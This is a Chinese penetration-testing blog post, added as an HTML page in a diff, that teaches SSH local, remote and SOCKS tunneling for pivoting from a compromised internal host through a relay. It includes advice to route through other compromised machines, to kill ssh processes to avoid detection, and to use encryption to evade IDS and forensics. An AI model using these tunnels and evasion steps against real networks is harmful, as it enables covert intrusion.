@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="通向彼岸 之内网代理转发 [ ssh隧道 ]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>通向彼岸 之内网代理转发 [ ssh隧道 ] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/09/21/ssh-portforward/">
+                通向彼岸 之内网代理转发 [ ssh隧道 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-21</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/ssh-portforwd/">ssh portforwd</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>0x01 此次用于实验的大致环境,如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">lnmp01</span> 	<span class="selector-attr">[centOS6.8_x64]</span> 	<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.30</span>  	假设为自己公网的<span class="selector-tag">vps</span><span class="selector-attr">[一般都会用一台公网的linux肉鸡]</span>,等会儿主要用来负责<span class="selector-tag">ssh</span>转发</div><div class="line"><span class="selector-tag">MidLAMP</span> <span class="selector-attr">[centOS6.8_x64]</span> 	<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.32</span><span class="selector-class">.193</span>	假设为目标内网中的一台<span class="selector-tag">linux</span>机器,能正常连公网</div><div class="line"><span class="selector-tag">win2008cn</span>			<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.32</span><span class="selector-class">.170</span>	假设为目标内网中的一台<span class="selector-tag">windows</span>机器,不能连公网</div><div class="line"><span class="selector-tag">win2008R2cn</span> 			<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span>	假设为目标公网中的一台<span class="selector-tag">windows</span>机器,<span class="selector-tag">rdp</span>只能通过192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.x</span>这个<span class="selector-tag">ip</span>段访问</div><div class="line"><span class="selector-tag">win7en</span> 				<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.32</span><span class="selector-class">.195</span>	假设为自己本地内网中的一台<span class="selector-tag">windows</span>机器</div><div class="line"><span class="selector-tag">win7en_bak</span>			<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.17</span>	假设为自己公网的另一台<span class="selector-tag">windows</span>机器</div></pre></td></tr></table></figure></p>
+<p>0x02 关于ssh 工具本身选项用途简介 [更多详情,请自行man ssh,帮助手册里面说的非常详细]:<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">C  压缩传输数据,加快传输速度</span></div><div class="line">-<span class="ruby">f  后台对用户名密码进行认证</span></div><div class="line">-<span class="ruby">N  仅仅只用来转发,不用再弹回一个新的shell</span></div><div class="line">-<span class="ruby">n  后台运行</span></div><div class="line">-<span class="ruby">q  安静模式,不要显示警告等信息</span></div><div class="line">-<span class="ruby">l  指定ssh登录名</span></div><div class="line">-<span class="ruby">g  允许远程主机连接到本地转发的端口     </span></div><div class="line">-<span class="ruby">L  进行本地端口转发</span></div><div class="line">-<span class="ruby">R  进行远程端口转发</span></div><div class="line">-<span class="ruby">D  动态转发,即socks代理</span></div><div class="line">-<span class="ruby">T  禁止分配伪终端</span></div><div class="line">-<span class="ruby">p  指定远程ssh服务端口</span></div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>0x03 在建立转发之前,我们需要先到自己的vps[lnmp01]上对ssh做些简单调整顺便创建用于转发的系统用户,具体如下,一切完毕之后务必记得重启ssh服务<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> vi /etc/ssh/sshd_config</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="string">PermitRootLogin</span> <span class="literal">yes</span>  	<span class="string">允许root远程登陆,其实并不建议这样干</span></div><div class="line"><span class="string">AllowTcpForwarding</span> <span class="literal">yes</span></div><div class="line"><span class="string">GatewayPorts</span> <span class="literal">yes</span>	</div><div class="line"><span class="string">TCPKeepAlive</span> <span class="literal">yes</span>  	<span class="string">保持心跳,防止ssh断开</span></div><div class="line"><span class="string">PasswordAuthentication</span> <span class="literal">yes</span></div><div class="line"><span class="string">ServerAliveInterval=20</span></div><div class="line"><span class="string">ServerAliveCountMax=8</span></div></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> /etc/init.d/sshd restart</span></div></pre></td></tr></table></figure>
+<p>创建用于转发的用户<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> useradd -s /sbin/nologin klion</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"admin110"</span> | passwd --stdin klion</span></div></pre></td></tr></table></figure></p>
+<p>0x04 首先,进行最常见的ssh本地端口转发,注意,这里可以一次转发多个端口<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">下面这句话的意思,就是将本地机器的某个端口转发到指定的远程机器的某个端口上</div><div class="line">既然是转发,肯定少不了个中间人,这个中间人到底是谁呢,其实就是@后面的机器</div><div class="line">实际的应用场景比较多,比如企业内部代理上网,个人翻墙,其实用的都是类似的东西...</div><div class="line">但对于渗透来讲,我们用的最多的可能还是让目标内网中一些不能正常连网的机器也能通过此方式来正常上线</div></pre></td></tr></table></figure></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">ssh</span> <span class="selector-tag">-C</span> <span class="selector-tag">-f</span> <span class="selector-tag">-N</span> <span class="selector-tag">-g</span> <span class="selector-tag">-L</span> <span class="selector-attr">[本地机器ip]</span>:本地机器指定的端口:远程机器<span class="selector-tag">ip</span>:远程机器指定的端口 <span class="selector-tag">tmpuser</span>@<span class="keyword">vps</span>上的<span class="keyword">ssh</span>服务 -p vps ssh的服务端口</div></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">假设当前所在的机器为win2008cn[<span class="number">192.168</span><span class="number">.32</span><span class="number">.170</span>],我现在想通过MidLAMP这台机器来访问win2008R2cn的rdp</div><div class="line">事先我们已经知道win2008R2cn和lnmp01是可以正常通信的,那么现在就可以这么干</div></pre></td></tr></table></figure>
+<p>在MidLAMP这台目标机器上执行:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">ssh</span> <span class="selector-tag">-C</span> <span class="selector-tag">-f</span> <span class="selector-tag">-N</span> <span class="selector-tag">-g</span> <span class="selector-tag">-L</span> 192<span class="selector-class">.168</span><span class="selector-class">.32</span><span class="selector-class">.193</span><span class="selector-pseudo">:1234</span><span class="selector-pseudo">:192.168.3.23</span><span class="selector-pseudo">:3389</span> <span class="selector-tag">klion</span>@<span class="keyword">192</span>.<span class="keyword">168</span>.<span class="keyword">3</span>.<span class="keyword">30</span> -p <span class="number">22</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ssh_forward_local.png" alt=""></p>
+<p>此时回到win2008cn这台机器上访问MidLAMP的1234端口就相当于访问win2008R2cn的3389<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">mstsc</span> 192<span class="selector-class">.168</span><span class="selector-class">.32</span><span class="selector-class">.193</span><span class="selector-pseudo">:1234</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ssh_forward_local_res.png" alt=""></p>
+<p>用完以后记得立马把ssh进程kill掉,尽量别被发现<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> ps -le | grep ssh</span></div><div class="line"><span class="meta">#</span><span class="bash"> netstat -tulnp</span></div><div class="line"><span class="meta">#</span><span class="bash"> killall ssh</span></div></pre></td></tr></table></figure></p>
+<p>0x05 理解了简单的本地端口转发,我们再来看远程转发<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">最好以root权限登录,因为直接在远程机器上侦听端口可能需要提供特权,这也是为什么这里最好直接用肉鸡的原因,自己的vps很容易暴露</div><div class="line">如果你真正理解了本地转发,其实远程转发就更容易了,本地转发有点儿类似我们的正向代理,而远程转发,则是完全相反的方向,类似我们的反向代理</div><div class="line">正常情况下,公网是不能直接访问内网特定的机器的<span class="string">[一般都是nat进去的]</span></div><div class="line">但你现在想进一步对目标内网进行渗透,你希望在目标内网有个跳板机,就可以尝试利用这种方式来绕进去</div><div class="line">简单来说就是通过公网的某台机器作为中转,来访问目标内网中的某台特定的肉鸡,具体转发如下</div></pre></td></tr></table></figure></p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ssh -<span class="keyword">C</span> -f -<span class="keyword">N</span> -g -R [本地机器:]本地机器指定端口:指定的内网机器:指定内网机器上的指定端口 root@公网中转机器 -p ssh服务端口</div></pre></td></tr></table></figure>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">假设我现在想实现这样的效果,我想在自己本地的机器上<span class="string">[win7en]</span>,通过lnmp01这台中转机来访问目标内网中的win2008cn机器,就可以这样做</div><div class="line">在目标内网已控的linux机器上<span class="string">[MidLAMP]</span>执行下面的转发,速度可能会稍慢</div></pre></td></tr></table></figure>
+<p>在MidLAMP这台目标机器上执行:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">ssh</span> <span class="selector-tag">-C</span> <span class="selector-tag">-f</span> <span class="selector-tag">-N</span> <span class="selector-tag">-g</span> <span class="selector-tag">-R</span> 0<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-pseudo">:2500</span><span class="selector-pseudo">:192.168.32.170</span><span class="selector-pseudo">:3389</span> <span class="selector-tag">root</span>@<span class="keyword">192</span>.<span class="keyword">168</span>.<span class="keyword">3</span>.<span class="keyword">30</span> -p <span class="number">22</span></div></pre></td></tr></table></figure></p>
+<p>此时再回到win7en上执行,即可访问目标内网中的win2008cn机器的3389<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">mstsc</span>  192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.30</span><span class="selector-pseudo">:2500</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ssh_forward_remote_res.png" alt=""></p>
+<p>0x06 理解了简单的端口转发后,最后我们再来看看如何利用ssh简单实现动态端口转发 [即socks代理]<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">我们要实现的最终效果就是,本地只需配合各种socks客户端代理工具,即可访问目标内网中的各类资源</div><div class="line">关于socks代理本身,我想已经不用再说了,估计大家早已轻车熟路,基于ssh的socks代理默认是<span class="built_in"> socks </span>4/5</div></pre></td></tr></table></figure></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">还是接着上面的话题,如果我们想进一步对目标内网进行渗透,每次都一个个端口进行转发估计要累死</div><div class="line">有没有一种更好的方式能把整个目标内网都代理出来呢,不用想,肯定是有的,下面我就来简要说明下,如何利用ssh帮我们实现这种需求</div></pre></td></tr></table></figure>
+<p>依然是通过已控的linux机器[MidLAMP],使其通过lnmp01建立一条socks通道,具体如下,先在MidLAMP上执行如下命令<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">ssh</span> <span class="selector-tag">-qTfnN</span> <span class="selector-tag">-D</span> 0<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-pseudo">:1080</span> <span class="selector-tag">root</span>@<span class="keyword">192</span>.<span class="keyword">168</span>.<span class="keyword">3</span>.<span class="keyword">30</span> -p <span class="number">22</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ssh_forward_socks.png" alt=""></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">做好上面的转发之后,再回到win7en_bak这台机器上,利用putty通过动态端口的方式连到lnmp01</div><div class="line">意思就是通过lnmp01将MidLAMP机器的<span class="number">1080</span>端口和win7en_bak的<span class="number">1235</span>端口进行绑定,即建立socks</div><div class="line">这样当访问win7en_bak的<span class="number">1235</span>端口就相当于访问MidLAMP所在的整个目标内网段</div><div class="line">至于各种socks客户端代理工具,我想这里就不多说了,个人比较喜欢Proxifier,大家随意,sockscap,proxychains都行,最终效果如下</div></pre></td></tr></table></figure>
+<p><img src="/img/ssh_forward_socks_putty.png" alt=""><br><img src="/img/ssh_forward_socks_putty_res.png" alt=""><br><img src="/img/ssh_forward_socks_putty_local_port.png" alt=""><br><img src="/img/ssh_forward_socks_putty_res_connect.png" alt=""><br><img src="/img/ssh_forward_socks_putty_res_connect_res.png" alt=""><br><img src="/img/ssh_forward_socks_putty_res_connect_firefix.png" alt=""></p>
+<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;大家也看到了整个代理过程,真正理解了以后其实非常简单,利用ssh不管是做转发还是socks代理,唯一的好处就是通信数据全程加密,一定程度上课有效对抗各类ids,ips和取证,缺点可能就是速度可能会稍慢,不过也不是特别慢,对于渗透linux内网,这样做无疑是极好的,其实,以此衍生出的用法还有非常多,以后抽空再跟大家一一介绍,另外,暂时不用过于纠结某些学术名词,能达到我们最终的目的即可,了解那些术语,无非就是想看文章的时候更好地理解别人的意思</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/ssh-portforwd/">#ssh portforwd</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
